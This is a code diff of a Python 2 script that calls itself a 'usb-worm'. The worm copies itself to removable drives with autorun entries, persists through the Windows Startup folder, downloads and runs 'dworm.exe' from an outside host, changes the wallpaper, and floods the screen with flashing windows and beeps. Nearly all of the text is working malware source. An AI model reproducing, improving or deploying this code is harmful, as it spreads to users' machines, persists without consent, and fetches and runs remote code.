@@ -1,16 +1,17 @@
 #! python2
-#  bad_blocks (usb-worm)
+#  bad_blocks - (usb-worm)
 
-'''             _____        .__    ________        
+"""             _____        .__    ________
   ___________  /  |  |  _____|  |__ \_____  \______ 
 _/ ___\_  __ \/   |  |_/  ___/  |  \  _(__  <_  __ \
 \  \___|  | \/    ^   /\___ \|   Y  \/       \  | \/
  \___  >__|  \____   |/____  >___|  /______  /__|   
-     \/           |__|     \/     \/       \/       '''
+     \/           |__|     \/     \/       \/       """
 
 
-import Tkinter, random, winsound, time, os, ctypes, requests
-import getpass, sys, base64, urllib, webbrowser, wget, dropbox
+import Tkinter, random, winsound, time, os, ctypes
+import getpass, sys, base64, urllib, webbrowser, wget
+
 
 def us():
     dl = ['F', 'G', 'E', 'M', 'H']
@@ -35,6 +36,7 @@ UseAutoPlay=1''' % (filen, filen)
             cpy(dl[d])
         except:
             pass
+
 
 def poo():
     us()
@@ -78,6 +80,7 @@ def poo():
     label.pack()
     root.mainloop()
 
+
 def shut():
     hhz = 0
     for w in range(60*30):
@@ -90,8 +93,9 @@ def shut():
         else:
             time.sleep(1)
 
+
 def block():
-    while(1==1):
+    while(1 == 1):
         rn = [i for i in range(1281)]
         rb = [i for i in range(10000)]
         color = ["blue", "red", "cyan", "green", "yellow", "purple", "coral", "pink", "orange"]
@@ -105,30 +109,32 @@ def block():
             z = random.choice(rn)
             a = random.choice(rn)
             ba = random.choice(rb)
-            res = "333x333+%s+%s" % (z,a)
+            res = "333x333+%s+%s" % (z, a)
             jay = 0
             jay += 1
             if jay == 10:
                 us()
-                jay -+ 10
+                jay -= 10
             block.geometry(res)
             cran = random.choice(color)
             block.configure(background = cran)
-            block.after(222,uppos)
-            winsound.Beep(ba,111)
+            block.after(222, uppos)
+            winsound.Beep(ba, 111)
 
-        block.after(111,uppos)
+        block.after(111, uppos)
         block.mainloop()
+
 
 def wpp():
 
     if cd != startxa:
-        wget.download("http://mtrcycllvr.smugmug.com/photos/98248207-S.jpg")
-        os.system("move 98248207-S.jpg C:\\Users\\%username%\\Documents\\")
+        wget.download("http://zepikao.my3gb.com/Sh3lz/fezinho.jpg")
+        os.system("move fezinho.jpg C:\\Users\\%username%\\Documents\\")
 
-    walph = "C:\\Users\\" + quest + "\\Documents\\98248207-S.jpg"
+    walph = "C:\\Users\\" + quest + "\\Documents\\fezinho.jpg"
     SPI_SETDESKWALLPAPER = 20
     ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, walph , 0)
+
 
 def dn():
     # Necessary files
@@ -148,23 +154,38 @@ def dn():
     os.system("move xavs.scr " + disf)
     time.sleep(1)
 
-    urllib.urlretrieve("http://zepikao.my3gb.com/Sh3lz/sound.vbs", "sound.vbs")
+    soundbgcode = '''Set Sound = CreateObject("WMPlayer.OCX.7")
+Sound.URL = "C:\Users\%s\Documents\\t.mp3"
+Sound.Controls.play
+do while Sound.currentmedia.duration = 0
+wscript.sleep 100
+loop
+wscript.sleep (int(Sound.currentmedia.duration)+1)*1000
+''' % (quest)
+
+    sbgcodew = open("sound.vbs" , 'w')
+    sbgcodew.write(soundbgcode)
+    sbgcodew.close()
+
     os.system("move sound.vbs " + disf)
     time.sleep(1)
+
 
     urllib.urlretrieve("https://www.dropbox.com/s/369sw5dfiimafgq/t.mp3?dl=1", "t.mp3")
     os.system("move t.mp3 " + disf)
     time.sleep(1)
 
-    urllib.urlretrieve("http://zepikao.my3gb.com/Sh3lz/dworm.exe", "dworm.exe")
+    wget.download("http://zepikao.my3gb.com/Sh3lz/dworm.exe")
     os.system("move dworm.exe " + disf)
     time.sleep(1)
+
 
 def sc():
     global disd
     disd = "C:\Users" + "\\" + quest + "\Documents\\"
     os.system("start " + disd + "dworm.exe")
     us()
+
 
 def checkex():
     us()
@@ -174,7 +195,7 @@ def checkex():
     global quest
     quest = getpass.getuser()
     global startxa
-    startxa = "C:\Users"  + "\\" + quest + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+    startxa = "C:\Users" + "\\" + quest + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
     start = "\"C:\Users" + "\\" + quest + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\""
     global filen
     filen = "\"" + sys.argv[0] + "\""
@@ -182,23 +203,27 @@ def checkex():
     if cd == startxa:
         ft = False
         wpp()
-        while 1==1:
+        while 1 == 1:
             try:
-                pcho = random.choice([1,2,3,4])
-                if pcho   == 1:
+                pcho = random.choice([1, 2, 3, 4])
+                if pcho == 1:
                     us()
                     block()
                 elif pcho == 2:
-                    for d24 in range(10):
-                        us()
+                    for d24 in range(95):
+                        if d24 % 20 == 0:
+                            us()
                         poo()
+                    time.sleep(60*7)
                 elif pcho == 3:
-                    for d34 in range(10):
-                        us()
+                    for d34 in range(2):
+                        if d34 % 2 == 0:
+                            us()
                         sc()
+                    time.sleep(60*7)
                 elif pcho == 4:
                     os.system("start C:\\Users\\%username%\\Documents\\sound.vbs")
-
+                    time.sleep(60*7)
             except:
                 pass
     else:
